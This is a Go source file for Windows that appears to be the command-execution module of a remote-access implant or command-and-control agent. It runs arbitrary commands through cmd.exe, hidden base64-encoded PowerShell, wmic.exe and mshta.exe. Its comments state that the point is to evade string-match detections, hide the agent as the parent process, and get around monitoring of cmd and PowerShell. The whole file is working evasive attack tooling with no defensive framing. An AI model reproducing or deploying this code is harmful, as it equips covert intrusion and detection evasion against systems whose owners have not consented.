//go:build windows

package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
	"unicode/utf16"
)

// runCommand dispatches to the configured execution method (baked in at build time).
// method: direct | cmd | powershell | wmi | mshta
func runCommand(method, command string, timeout int) (stdout, stderr string, exitCode int) {
	ctx := context.Background()
	if timeout > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, time.Duration(timeout)*time.Second)
		defer cancel()
	}

	switch method {
	case "powershell", "ps":
		return execPowerShell(ctx, command)
	case "wmi":
		return execWMIC(ctx, command)
	case "mshta":
		return execMSHTA(ctx, command)
	default: // "direct", "cmd"
		return execCMD(ctx, command)
	}
}

// execCMD runs a command via cmd.exe /C
func execCMD(ctx context.Context, command string) (string, string, int) {
	cmd := exec.CommandContext(ctx, "cmd.exe", "/C", command)
	var out, errBuf bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &errBuf
	err := cmd.Run()
	return strings.TrimSpace(out.String()), strings.TrimSpace(errBuf.String()), exitCodeFrom(err)
}

// execPowerShell runs a command via powershell.exe -EncodedCommand (UTF-16LE base64).
// Bypasses many string-match detections on "powershell -c".
func execPowerShell(ctx context.Context, command string) (string, string, int) {
	encoded := psEncode(command)
	cmd := exec.CommandContext(ctx,
		"powershell.exe",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-EncodedCommand", encoded,
	)
	var out, errBuf bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &errBuf
	err := cmd.Run()
	return strings.TrimSpace(out.String()), strings.TrimSpace(errBuf.String()), exitCodeFrom(err)
}

// execWMIC uses wmic.exe (LOLBin) to create a process via the WMI subsystem.
// The spawned process parent is the WMI host (svchost.exe), not our agent.
// Output is captured via a temp file since WMI Create does not inherit handles.
// Note: wmic.exe is deprecated on Windows 11 — use "powershell" method on Win11 targets.
func execWMIC(ctx context.Context, command string) (string, string, int) {
	tmp := fmt.Sprintf(`%s\~%d.tmp`, os.TempDir(), time.Now().UnixNano())
	wrapped := fmt.Sprintf(`cmd.exe /C %s > "%s" 2>&1`, command, tmp)

	cmd := exec.CommandContext(ctx, "wmic.exe", "process", "call", "create", wrapped)
	err := cmd.Run()

	// Poll for output — WMI creates the child process asynchronously
	deadline := time.Now().Add(15 * time.Second)
	if dl, ok := ctx.Deadline(); ok && dl.Before(deadline) {
		deadline = dl
	}
	var output string
	for time.Now().Before(deadline) {
		if data, readErr := os.ReadFile(tmp); readErr == nil && len(data) > 0 {
			output = strings.TrimSpace(string(data))
			break
		}
		time.Sleep(300 * time.Millisecond)
	}
	os.Remove(tmp)
	return output, "", exitCodeFrom(err)
}

// execMSHTA uses mshta.exe (LOLBin) to execute a command via WScript.Shell.
// Useful when cmd.exe and powershell.exe execution are monitored.
func execMSHTA(ctx context.Context, command string) (string, string, int) {
	tmp := fmt.Sprintf(`%s\~%d.tmp`, os.TempDir(), time.Now().UnixNano())
	escapedCmd := strings.ReplaceAll(command, `"`, `\"`)
	escapedTmp := strings.ReplaceAll(tmp, `\`, `\\`)
	script := fmt.Sprintf(
		`javascript:a=new ActiveXObject("WScript.Shell");`+
			`a.Run("cmd /C %s > \"%s\" 2>&1",0,true);close();`,
		escapedCmd, escapedTmp,
	)
	cmd := exec.CommandContext(ctx, "mshta.exe", script)
	err := cmd.Run()

	data, _ := os.ReadFile(tmp)
	os.Remove(tmp)
	return strings.TrimSpace(string(data)), "", exitCodeFrom(err)
}

// psEncode encodes a PowerShell command as UTF-16LE base64 for -EncodedCommand.
func psEncode(command string) string {
	u := utf16.Encode([]rune(command))
	b := make([]byte, len(u)*2)
	for i, r := range u {
		binary.LittleEndian.PutUint16(b[i*2:], r)
	}
	return base64.StdEncoding.EncodeToString(b)
}

func exitCodeFrom(err error) int {
	if err == nil {
		return 0
	}
	if ee, ok := err.(*exec.ExitError); ok {
		return ee.ExitCode()
	}
	return 1
}
